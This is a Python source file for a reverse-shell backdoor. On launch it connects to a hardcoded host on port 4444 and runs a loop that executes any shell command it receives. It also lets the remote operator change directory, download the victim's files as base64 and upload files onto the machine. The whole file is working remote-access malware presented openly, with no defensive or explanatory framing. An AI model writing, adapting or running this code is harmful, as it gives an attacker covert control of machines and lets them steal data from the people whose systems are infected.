# !usr/bin/env python
import socket
import subprocess
import json
import os
import base64
class Backdoor:
    def __init__(self,ip,port):
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM) #SOCK_STREAM is for TCP connection
        self.connection.connect((ip,port))

    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data=''
        while True:
            try:
                json_data=json_data+self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    
    def change_directory(self,path):
        os.chdir(path)
        return '[+] Changing directory to '+path

    def read_file(self,path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read()) #use base64 encoding to handle binary data, if not throws error
        
    def write_file(self,path,content):
        with open(path,'wb') as file:
            file.write(base64.b64decode(content))
            return '[+] Upload successful'

    def execute_system_command(self,command):
        return subprocess.check_output(command,shell=True)
    
    def execute_command(self,command):
        try:
            if command[0]=='exit':
                self.connection.close()
                exit()
            elif command[0]=='cd' and len(command)>1:
                return self.change_directory(command[1])
            elif command[0]=='download':
                return self.read_file(command[1])
            elif command[0]=='upload':
                self.reliable_send('ok')
                file_content=self.reliable_receive()
                return self.write_file(command[1],file_content)
            else:
                return self.execute_system_command(command)
        except Exception:
            return '[-] Error during command execution'

    def run(self):
        while True:
            command=self.reliable_receive()
            command_result=self.execute_command(command)  
            self.reliable_send(command_result)
            

my_backdoor=Backdoor('192.168.209.138',4444)
my_backdoor.run()